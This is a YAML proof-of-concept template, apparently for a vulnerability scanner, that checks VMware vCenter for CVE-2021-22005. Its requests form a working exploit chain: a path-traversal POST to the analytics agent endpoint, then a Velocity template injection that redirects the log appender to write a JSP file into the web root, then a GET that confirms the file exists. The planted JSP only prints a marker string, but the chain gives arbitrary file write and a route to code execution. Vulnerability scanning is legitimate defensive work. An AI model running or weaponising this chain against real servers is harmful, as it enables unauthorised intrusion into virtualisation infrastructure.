name: poc-yaml-vmware-cve-2021-22005-file-upload
binding: 522927d5-e4d1-4890-a349-bf1a9dcb5ef0
manual: true
detail:
    author: Jarcis-cy(https://github.com/jarcis-cy)
    links:
        - https://blog.csdn.net/qq_44159028/article/details/120551527
    vulnerability:
        id: CT-183141
        level: critical
    warning: 注意该脚本会上传文件产生一个临时的无害文件
transport: http
set:
    f1: randomLowercase(10)
    s1: randomLowercase(6)
    s2: randomLowercase(6)
rules:
    test:
        request:
            cache: true
            method: POST
            path: /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c={{s1}}&_i={{s2}}
            headers:
                Content-Type: application/json
                X-Deployment-Secret: abc
            body: '{"manifestSpec": {}, "objectType": "a2", "collectionTriggerDataNeeded": true, "deploymentDataNeeded": true, "resultNeeded": true, "signalCollectionCompleted": true, "localManifestPath": "a7", "localPayloadPath": "a8", "localObfuscationMapPath": "a9"}'
        expression: response.status == 201
    r0:
        request:
            cache: true
            method: POST
            path: /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c={{s1}}&_i={{s2}}
            headers:
                Content-Type: application/json
                X-Deployment-Secret: abc
            body: '{"contextData": "a3", "manifestContent": "<manifest recommendedPageSize=\"500\">\n       <request>\n          <query name=\"vir:VCenter\">\n             <constraint>\n                <targetType>ServiceInstance</targetType>\n             </constraint>\n             <propertySpec>\n                <propertyNames>content.about.instanceUuid</propertyNames>\n                <propertyNames>content.about.osType</propertyNames>\n                <propertyNames>content.about.build</propertyNames>\n                <propertyNames>content.about.version</propertyNames>\n             </propertySpec>\n          </query>\n       </request>\n       <cdfMapping>\n          <indepedentResultsMapping>\n             <resultSetMappings>\n                <entry>\n                   <key>vir:VCenter</key>\n                   <value>\n                      <value xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n                         <resourceItemToJsonLdMapping>\n                            <forType>ServiceInstance</forType>\n                         <mappingCode><![CDATA[    \n                            #set($appender = $GLOBAL-logger.logger.parent.getAppender(\"LOGFILE\"))##\n                            #set($orig_log = $appender.getFile())##\n                            #set($logger = $GLOBAL-logger.logger.parent)##     \n                            $appender.setFile(\"/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/{{f1}}.jsp\")##     \n                            $appender.activateOptions()##  \n                            $logger.warn(\"\\u003c\\u0025\\u0020\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u0028\\u0022\\u0061\\u0073\\u0064\\u0066\\u0067\\u0068\\u0076\\u0066\\u0074\\u0079\\u0064\\u0075\\u0077\\u006a\\u0068\\u0064\\u006a\\u0075\\u0079\\u0074\\u0032\\u0031\\u0036\\u0037\\u0038\\u0065\\u0075\\u0033\\u0039\\u0068\\u0037\\u0064\\u0033\\u0032\\u0068\\u0065\\u0079\\u0075\\u0077\\u006a\\u0069\\u0071\\u0079\\u0074\\u0065\\u0072\\u0079\\u0037\\u0075\\u0033\\u0039\\u0032\\u0032\\u0074\\u0036\\u0067\\u0031\\u0037\\u0068\\u0065\\u0038\\u0064\\u0077\\u0068\\u0022\\u0029\\u003b\\u0020\\u0025\\u003e\")##   \n                            $appender.setFile($orig_log)##     \n                            $appender.activateOptions()##]]>\n                         </mappingCode>\n                         </resourceItemToJsonLdMapping>\n                      </value>\n                   </value>\n                </entry>\n             </resultSetMappings>\n          </indepedentResultsMapping>\n       </cdfMapping>\n       <requestSchedules>\n          <schedule interval=\"1h\">\n             <queries>\n                <query>vir:VCenter</query>\n             </queries>\n          </schedule>\n       </requestSchedules>\n    </manifest>", "objectId": "a2"}'
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /idm/..;/{{f1}}.jsp
        expression: response.status == 200 && response.body.bcontains(bytes("asdfghvftyduwjhdjuyt21678eu39h7d32heyuwjiqytery7u3922t6g17he8dwh"))
expression: test() && r0() && r1()
